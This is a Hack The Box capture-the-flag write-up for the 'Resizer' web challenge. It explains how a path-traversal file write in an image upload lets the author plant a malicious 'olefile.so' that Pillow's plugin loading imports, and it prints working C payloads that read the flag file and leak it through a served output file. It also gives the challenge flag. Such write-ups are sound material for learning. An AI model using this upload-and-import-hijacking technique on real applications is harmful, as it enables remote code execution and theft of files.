---
title: "Resizer"
slug: "htb-resizer"
platform: "Hack The Box"
difficulty: "Hard"
vulnerabilities: ["Arbitrary File Write","Python Import Hijacking"]
publishedAt: "2026-09-14"
summary: "Phân tích chức năng resize ảnh, cách xử lý tên file và cơ chế nạp module Python."
draft: false
sortOrder: 5
---
## Challenge Info
**Category:** Web 
**Difficulty:** Hard 
**Platform:** Hack The Box 
**Description:** a simple website to resize pictures, there is no way you can hack it
**Tags:** `#Web` `#Path Traversal` `#Arbitrary File Write` `#Python Module Hijacking`
## Overview
Resizer is a basic web to resize image. User can upload image file, choose resize options and receive handled image in PNG. This app seem no especially but it treats image in server so upload function become attack surface.Notably, backend doesn't check filename or standardization; therefore, this bug become arbitrary file write and RCE.
## Source code analysis
```text=
app/
├── app.py
│   ├── receives uploaded file
│   ├── reads user-controlled filename
│   ├── builds path with 
│   ├── os.path.join("uploads", filename)
│   ├── saves uploaded file
│   ├── opens image with Pillow
│   └── writes resized PNG output
│
├── uploads/
│   └── intended upload location
│
└── resized/
    └── generated resized images
```
1. **app.py**
![image](https://hackmd.io/_uploads/SyX7rOcaZx.png)
![image](https://hackmd.io/_uploads/BJvMD_9TZl.png)
=> This code has a bug that allow user to controll filename.This leads to arbitrary file write from path traversal. Blacklist extension/content-type is a weak protection and easy to bypass.
2. **Dockerfile**
![image](https://hackmd.io/_uploads/HJ5MY_56Zg.png)
=> This Dockerfile creates the `/app` directory and set it as container's working directory. Then it copies entire `challenge` source to `/app`.Finally it creates `/app/uploads` and change ownership to `app:app` so app runs as user `app`, it can write inside `/app`
3. **utils/resizer.py**
![image](https://hackmd.io/_uploads/rknmoOq6Zg.png)
=> It simply calls to functions `resize_image` in file helpers
4. **utils/helpers.py**
![image](https://hackmd.io/_uploads/HJfSwei6-e.png)
=> Normally, when `Pillow` open file, it will try to identify image file. If it is a valid PNG/JPG. it uses `PngImagePlugin` /`JpegImagePlugin`. But if it cannot identifiied by the common plugin, Pillow will initializes the remaining plugins. In Pillow, `preinit()` only loads normal format, if not enough it will call `Image.init()` and import all plugins in list `_plugins`
## Exploitation chain and flag
### The Approach
Now we can arbitary file write but onl with target path doesn't exist. But what file make this app auto load/run?! We see that in **utils/helpers.py** has mechanism that auto load plugins if normal format is not enough. Some file like `.txt` `.jpg` `.bin` will never works if app doesn't read or import it.
![image](https://hackmd.io/_uploads/By5oG-sabe.png)
We can see that Python accept native extension module like `module.cpython-312-x86_64-linux-gnu.so`,`module.abi3.so`,`module.so`. However, like we mentioned many times Pillow use plugin system to recognize image format, I used grep and can see that Pillow has plugin import olefile. Normally when Python `import olefile.so`, it will file module `olefile` along `sys.path`.**So if we can put `/app/olefile.so`,Python can load our file**
It called **Python import hijacking**
We can think to this flow:
1. Upload with filename  =/app/olefile.so
2. app.py will save paydload to /app/olefile/so
3. call resizer, helpers.py call Image.open()
4. .so is not valid image cand need to load more plugin
5. FpxImagePlugin import olefile
6. Native module loaded and payload triggered
### Exploitation
Firstly, I test with payload like this
```c=
// olefile_marker.c
#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <stdio.h>
__attribute__((constructor))
static void on_load(void) {
    FILE *f = fopen("/tmp/olefile_loaded", "a");
    if (f) {
        fprintf(f, "olefile.so loaded\n");
        fclose(f);
    }
}
static struct PyModuleDef moduledef = {
    PyModuleDef_HEAD_INIT,
    "olefile",
    NULL,
    -1,
    NULL
};
PyMODINIT_FUNC PyInit_olefile(void) {
    return PyModule_Create(&moduledef);
}
```
When the `.so`  is loaded (`dlopen`) its constructor run and write line "olefile.so loaded" in to file `/tmp/olefiled_loaded`
![image](https://hackmd.io/_uploads/r1f3VzjaZe.png)
=> This result means the .so has been succesfully loaded by Python
PoC create `olefile.so` to take flag
```python=
#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <stdio.h>

__attribute__((constructor))
static void run(void) {
    FILE *flag = fopen("/app/flag.txt", "r");
    if (!flag) flag = fopen("./flag.txt", "r");

    FILE *out = fopen("/app/uploads/leak_resized.png", "w");
    if (!out) return;

    if (!flag) {
        fprintf(out, "no flag\n");
        fclose(out);
        return;
    }

    char buf[4096] = {0};
    fread(buf, 1, sizeof(buf)-1, flag);

    fprintf(out, "%s\n", buf);

    fclose(flag);
    fclose(out);
}

static struct PyModuleDef m = {
    PyModuleDef_HEAD_INIT,
    "olefile",
    NULL,
    -1,
    NULL
};
PyMODINIT_FUNC PyInit_olefile(void) {
    return PyModule_Create(&m);
}
```
We create `olefile.so` with payload to read flag form system and write to file that web will return in request later
![image](https://hackmd.io/_uploads/S1F4pMj6-l.png)
We upload file `olefile.so` like this to bypass filter extension. But `.so` is not image so resize fail and app return 500. But `Image.open("/app/olefile.so")` Pillow also import `olefile` that file we upload and write `/app/uploads/leak_resized.png` (How to know this file name? we can easily see in app.py)

And in request later we do
![image](https://hackmd.io/_uploads/HyLV0Mip-g.png)
Upload any image with name `leak.png` ( any content inside) App will have output name `/app/uploads/leak_resized.png` and this file we write before and resize fail => app send file and we can see flag


We do in instance and have flag
![image](https://hackmd.io/_uploads/S12C0MjTZx.png)


**Flag: HTB{9be922e89b174104aeb824f4337fda01}**